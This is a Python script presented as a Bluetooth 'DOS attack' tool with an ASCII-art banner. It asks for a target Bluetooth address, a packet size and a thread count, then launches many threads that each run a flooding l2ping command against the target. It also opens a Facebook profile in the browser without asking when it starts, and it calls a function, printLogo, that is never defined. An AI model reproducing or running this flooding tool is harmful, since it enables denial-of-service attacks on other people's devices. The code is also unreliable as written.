import os
import threading
import time
os.system('xdg-open https://www.facebook.com/profile.php?id=100088538941322 ')
def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

logo = """
\033[1;92m 
8888888888 888     888 Y88b   d88P     d8888 8888888b.         d8888 
888        888     888  Y88b d88P     d88888 888   Y88b       d88888 
888        888     888   Y88o88P     d88P888 888    888      d88P888 
8888888    888     888    Y888P     d88P 888 888   d88P     d88P 888 
888        888     888     888     d88P  888 8888888P"     d88P  888 
888        888     888     888    d88P   888 888 T88b     d88P   888 
888        Y88b. .d88P     888   d8888888888 888  T88b   d8888888888 
888         "Y88888P"      888  d88P     888 888   T88b d88P     888 
                                                                     
                                                                    
   ─── ─\x1b[1;34m CREATOR /MIR SAKIL AHMAD XS 
\023[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
\x1b[1;92m[+] Author 	   :   Rubaida sultana fuyara
\x1b[1;91m[+] FACEBOOK	: HA HA HA HA HA 
\x1b[1;92m[+] GITHUB      :   https://github.com/msakilx
\x1b[1;98m[+] FROM         :   Drunk girls
\x1b[1;93m[+] TEAM 	    :   \33[1;42 CYBER XSEHG  \33[0m
\x1b[1;94m[+] VERSION   :\x1b[1;97m  1.0  \x1b[1;97m          
\033[1;80m•••••••••••••••••••••••••••••••••••••••••••••• 
"""

def main():
    print (logo)
    time.sleep(0.5)
    print('')
    print('\x1b[32m Hallow my name is rubaida sultana  i am drunk girls  .')
    
    
  
    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')

        target_addr = input('Target addr > ')

        if len(target_addr) < 1:
            print('[!] ERROR: Target addr is missing')
            exit(0)

        try:
            packages_size = int(input('Packages size > '))
        except:
            print('[!] ERROR: Packages size must be an integer')
            exit(0)
        try:
            threads_count = int(input('Threads count > '))
        except:
            print('[!] ERROR: Threads count must be an integer')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('[*] Building threads...\n')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Built all threads...')
        print('[*] Starting...')
    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))